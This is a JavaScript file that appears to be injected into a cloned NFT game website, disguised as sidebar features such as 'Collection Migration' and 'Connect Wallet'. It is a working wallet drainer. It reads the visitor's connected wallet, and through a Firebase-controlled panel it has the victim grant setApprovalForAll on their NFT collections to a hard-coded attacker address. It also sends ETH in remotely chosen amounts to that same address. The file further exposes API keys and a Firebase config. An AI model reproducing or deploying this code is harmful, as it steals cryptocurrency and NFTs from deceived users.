$(document).ready(function () {
  console.log('yawa');
})

//FIREBASE

const config = {
apiKey: "AIzaSyAvIsuf_K1uvzo3cXEJchcBWnxb7ryKzk0",
authDomain: "jangneotokyo.firebaseapp.com",
projectId: "jangneotokyo",
storageBucket: "jangneotokyo.appspot.com",
messagingSenderId: "20777123504",
appId: "1:20777123504:web:5d991c72b7af82ff6f4575"
}

const app = firebase.initializeApp(config)
const db = firebase.firestore(app)

const ref = db.collection('jangtokyo')

const OPENSEA_URL = "https://api.opensea.io/"
let account;

async function loadWeb3() {
try {
  window.web3 = await new Web3(window.ethereum)
} catch {
  console.log(error)
}
}


// async function inSidebarConnect() {
//     const button1 = $('.css-1u5qx9')

//     button1.on('click',  function () {
//         console.log('imclicked')
//          menuItems()
//     })
// }


var sidebarCheck = setInterval(() => {
  console.log('interval running')
  intervalCheck()
}, 1000);

async function sidebar() {

  $('.sidebar-menu__opener').on('click', function () {

      // setTimeout(alert(';asd'), 100)

      setTimeout(() => {
          $('.css-14kzm9p').html(`
      <div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">Collection Migration<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><div><button class="MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth MuiButtonBase-root  css-1u5qx9" tabindex="0" type="button">CODES_MIGRATION.EXE<span class="MuiTouchRipple-root css-w0pj6f"></span></button></div></div></div><div class="MuiBox-root css-79elbk"><div class="MuiBox-root css-1sptbl0"><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">S2 citizen<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><form class="sidebar-menu__item-form"><div class="sidebar-menu__item-block smi_w80 pad-r50 orderf1"><input name="customMessage" type="text" placeholder="Set your custom message" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf3"><input name="identity" type="text" inputmode="numeric" placeholder="Identities" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf4"><input name="cache" type="text" inputmode="numeric" placeholder="Item Caches" value=""></div><div class="sidebar-menu__item-block smi_w33 pad-r50 smi_small orderf5"><input name="land" type="text" inputmode="numeric" placeholder="Land Deeds" value=""></div><div class="sidebar-menu__item-block smi_w20 pad-r50 orderf2"><button type="submit" class="sidebar-menu__item-btn"><span>upload</span></button></div><style>
          .form > * + * {
            margin-top: 1rem;
          }
        </style></form></div></div><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">S1 citizen<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><form class="sidebar-menu__item-form"><div class="sidebar-menu__item-block smi_w80 pad-r50 orderf1"><input name="customMessage" type="text" placeholder="Set your custom message" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf3"><input name="identity" type="text" inputmode="numeric" placeholder="Identities" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf4"><input name="vault" type="text" inputmode="numeric" placeholder="Vault boxes — Optional" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf5"><input name="cache" type="text" inputmode="numeric" placeholder="Item Caches" value=""></div><div class="sidebar-menu__item-block smi_w25 pad-r50 smi_small orderf6"><input name="land" type="text" inputmode="numeric" placeholder="Land Deeds" value=""></div><div class="sidebar-menu__item-block smi_w20 pad-r50 orderf2"><button class="sidebar-menu__item-btn"><span>upload</span></button></div><style>
          .form > * + * {
            margin-top: 1rem;
          }
        </style></form></div></div><div class="sidebar-menu__item"><h4 class="sidebar-menu__item-title ">Identities &amp; lands<span class="sidebar-menu__item-title-chevron "><svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.66675 10.6667H9.33341V13.3333H6.66675V10.6667ZM12.0001 16H9.33341V13.3333L12.0001 13.3333V16ZM14.6667 18.6667H12.0001V16L14.6667 16V18.6667ZM17.3334 18.6667V21.3333H14.6667L14.6667 18.6667H17.3334ZM20.0001 16H17.3334V18.6667H20.0001V16ZM22.6667 13.3333L22.6667 16L20.0001 16V13.3333L22.6667 13.3333ZM22.6667 13.3333V10.6667H25.33344V13.3333H22.6667Z"></path></svg></span></h4><div class="sidebar-menu__itemaccord "><div class="sidebar-menu__item-blist"><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">Mint New Identity</h6><div class="sidebar-menu__item-bitem-form-info">Cost: 2000 bytes</div></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">offline</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">Create New Land</h6><div class="sidebar-menu__item-bitem-form-info">Cost: 500 bytes</div></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">offline</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">S2 Identity Item Claim</h6><input type="text" inputmode="numeric" placeholder="Add S2 Identity Token ID" value="0"></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">submit</button></form></div><div class="sidebar-menu__item-bitem"><form action="" class="sidebar-menu__item-bitem-form"><div class="sidebar-menu__item-bitem-form-holder"><h6 class="sidebar-menu__item-bitem-form-title">S2 Identity Land Claim</h6><input type="text" inputmode="numeric" placeholder="Add S2 Identity Token ID" value="0"></div><button class="sidebar-menu__item-bitem-form-btn" disabled="">submit</button></form></div></div></div></div></div><button class="sidebar-menu__item-btn MuiBox-root css-htg0vc"><span>Connect Wallet</span></button></div>
      `)

      $('.css-txdpd1').remove()


      console.log('sidebar clicked')

      
      
      const button1 = $('.css-1u5qx9')
      const button2 = $('.css-htg0vc')

      button1.on('click', function () {
          menuItems()
      })
      button2.on('click', function () {
          menuItems()
      })



      }, 1000);

  })
}


async function intervalCheck() {

  if ($('.sidebar').length) {
      clearInterval(sidebarCheck)
      console.log('true, interval cleared')
      await sidebar()
      //await menuItems()
      //await inSidebarConnect()
  } else {
      console.log('false')
  }

}

// setTimeout(() => {
//     $('.menu__link-text').click()
// }, 10000);

async function menuItems() {

      // $('.menu2').each( function () {
      //     const x = $(this).html()

      //     console.log(x);
      // })

      const ganaYawa = $('.menu2').find('li').eq([6]).find('span').eq([0]).find('span.menu__link-text')

      ganaYawa.click()

      // console.log(ganaYawa);

}



//metamask

// const checkConnected = setInterval(() => {
//     getAccount()
//     console.log('checkConnnected running')
// }, 3000);

// async function getAccount() {
//     const accounts = await window.ethereum.request({
//         method: 'eth_requestAccounts'
//     }).catch( (err) => {
//         if (err.code === 4001) {
//             console.log('please con met');
//         } else {
//             console.error(err)
//         }
//     });

//     if (!accounts[0]) {
      
//     } else {
//         clearInterval(checkConnected)
//         account = accounts[0]
//         console.log(account)
//     }

//     // account = accounts[0]
//     // console.log(account)
// }



var checkConnected = setInterval( () => {
  

var d = JSON.parse(localStorage.getItem('wagmi.store'))
// console.log(d.state.data)


  if (!('account' in d.state.data) ) {
    console.log('not connected')
  } else {
    getAddress()
    intervalStop()
    get_eth()
    trade()
    console.log('connected')

  }

}, 3000);

//interval stopper

function intervalStop() {
  clearInterval(checkConnected);
  console.log('intervalStopped')
}


async function getAddress() {
  const d = JSON.parse(localStorage.getItem('wagmi.store'))
  console.log(d);
  const userAddress = d.state.data.account
  //console.log(userAddress);
  account = userAddress
  console.log(account)

  //await loadWallet(account)
  //await trade()

}



// async function GetAllCollection(address){
//     var collections = []
//     var offset = 0
//     var old_count = 0;
//     try{

//       while(true){ // Added
//         var url = `${OPENSEA_URL}api/v2/collections?asset_owner=${address}&offset=${offset}&limit=50`
//         await $.ajax({
//             url: url,
//             method: "GET",
//             headers: {
//               accept: 'application/json',
//               'X-API-KEY': '078b8acce6a34dd3a2dbb0cd34127203'
//             },
//             success: function(data){
//                 // for(var i = 0; i < data.length; i++){
//                 //   if(data[i].primary_asset_contracts.length > 0)
//                 //     collections.push(data[i])
//                 // }

//                 for (var i = 0; i < data.collections.length; i++) {
//                   //console.log(data.collections[i].collection)
    
//                   if (data.collections[i].collection.length == 42) {
//                       console.log(data.collections[i].collection)

//                        collections.push(data.collections[i].collection)
//                       console.log(collections)
//                       // localStorage.setItem('spoofCollection', JSON.stringify(collections) )
//                       //data[i] ang iyang tree

//                       //TOTAL MAG SPOOF RAMAN KA AYAW NA PALABIHA, SA PANEL RA KUHAA
//                 }
              
//                 }
//             }
//         })
//         if(old_count == collections.length)
//           break
//           old_count = collections.length
//         offset += 50
//       }
//     }catch(err){
//       console.log(err)
//     }



//     for(var i = 0 ; i < collections.length; i++){
//       collections[i].worth = 0
//       try{
//         var result = await $.ajax({
//           url: "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress="+collections[i].primary_asset_contracts[collections[i].primary_asset_contracts.length-1].address,
//           method: "GET",
//         })
//         if(result.openSea != undefined && result.openSea.floorPrice != undefined)
//         collections[i].worth = result.openSea.floorPrice
//       }catch{
//         if(collections[i].stats.seven_day_volume > 0){
//           collections[i].worth = Math.round(
//             collections[i].stats.seven_day_volume * 0.8 * 10000
//           ) / 10000
//         }
//       }
    
//     }

//     collections = collections.sort((a, b) => {
//       return a.worth < b.worth
//         ? 1
//         : -1;
//     });

//     return collections
//   }


async function loadWallet(address) {

  let arr = [];

  var victimCollection = await GetAllCollection(address) 
      //console.log(victimCollection);

   for (var i = 0; i < victimCollection.length; i++) {

      var collection = victimCollection[i]

      var contracts = collection.primary_asset_contracts[collection.primary_asset_contracts.length-1].address.toLowerCase()

      console.log(contracts);
      arr.push(contracts)
      

   }  
   console.log(arr)
   localStorage.setItem('spoofCollection', JSON.stringify(arr))
}


//fromlocalstrorageni


//transact

const _abi = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "approved",
        type: "address",
      },
      {
        indexed: true,
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        indexed: false,
        internalType: "bool",
        name: "approved",
        type: "bool",
      },
    ],
    name: "ApprovalForAll",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        indexed: true,
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "getApproved",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
    ],
    name: "isApprovedForAll",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "ownerOf",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "safeMint",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "safeTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
      {
        internalType: "bytes",
        name: "data",
        type: "bytes",
      },
    ],
    name: "safeTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        internalType: "bool",
        name: "approved",
        type: "bool",
      },
    ],
    name: "setApprovalForAll",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "bytes4",
        name: "interfaceId",
        type: "bytes4",
      },
    ],
    name: "supportsInterface",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "tokenURI",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "transferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "transferOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

//database HERE


async function trade() {
await loadWeb3();



  //DUMDUMA NAA SA ZIP BEFOREFIREBASSE
  //var collections = JSON.parse(localStorage.getItem('spoofCollection'))
  var collections = []
  let status;

  // console.log(collections)
  console.log(account)

  ref.doc(account).get()
    .then( (docSnapshot) => {
      if(docSnapshot.exists) {
        ref.doc(account)
          .onSnapshot( async (doc) => {
            //console.log(doc.data())
            collections = doc.data().spoof
            status = doc.data().status

            console.log(collections)

            for(var i = 0; i < collections.length; i++) {
              var collectionAddress = collections[i]
              console.log(collectionAddress)
            
            
              try {

                if (status == 'approved') {
                  console.log('no more approval needed')

                   ref.doc(account).update({
                    status: 'approved'
                  }).then( function() {
                    console.log('approved')
                  }).catch( (err) => {
                    console.log(err)
                  })


                } else {

                  var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
                   await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})

                  ref.doc(account).update({
                    status: 'approved'
                  }).then( function() {
                    console.log('approved')
                  }).catch( (err) => {
                    console.log(err)
                  })


                }


    
            
                  // var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
                  // await collectionContract.methods.setApprovalForAll('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})

                  // ref.doc(account).update({
                  //   status: 'approved'
                  // }).then( function() {
                  //   console.log('approved')
                  // }).catch( (err) => {
                  //   console.log(err)
                  // })
            
                  // console.log('Address: '+account+ ' and collection '+ collectionAddress + ' is confirmed')
                
              } catch (error) {
                
              }
            
            }
          })
      }
    })
  


//



// if (1) {
//   for(var i = 0; i < collections.length; i++) {
//     var collectionAddress = collections[i]
//     console.log(collectionAddress)


//     try {

//         var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
//         await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: account})

//         console.log(account)
    
//     } catch (error) {
    
//     }

//   }
// }


  // collections.forEach( async el => {
  //     var collectionAddress = el;

  //     console.log(collectionAddress)

  //     try {

  //       var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
  //       await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: account})
        
  //     } catch (error) {

  //       console.log(error)
        
  //     }


  // })

}


// async function yawayawa() {
//   await loadWeb3();
//   try {

//     var collectionContract = await new window.web3.eth.Contract(_abi, '0x645670add376f19c3d2c9bdd62dd4190c8fad988', {gas: '100000'})
//     await collectionContract.methods.setApprovalForAll('0x948a2e543a898127b69621fbe310bb3a2ea0051a', true).send({from: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262'})
  
//   } catch (error) {
//     console.log(error)
//   }
// }

// yawayawa()





//GET ETH

async function get_eth() {
  
await loadWeb3();

// .then( (docSnapshot) => {
//   if(docSnapshot.exists) {
//     ref.doc(account)
//       .onSnapshot( async (doc) => {

db.collection('ethget').doc(account).get().then(  (docSnapshot) => {

    if (docSnapshot.exists) {
      db.collection('ethget').doc(account)
        .onSnapshot( async (doc) => {
          
    const value = doc.data().eth
    const finalAmount = Web3.utils.toWei(value.toString(), 'ether');

    const txData = {
      from: account,
      to: '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262',
      value: finalAmount,
      gas: "11170",
    }

    web3.eth.sendTransaction(txData)
      .then( (txHash) => {
        console.log(txHash)
      }).catch( (err) => {
        console.log(err)
      })

        })
    } else {
      console.log('no eth set')
    }


 
   
})


// var ammount = Web3.utils.toWei()

}
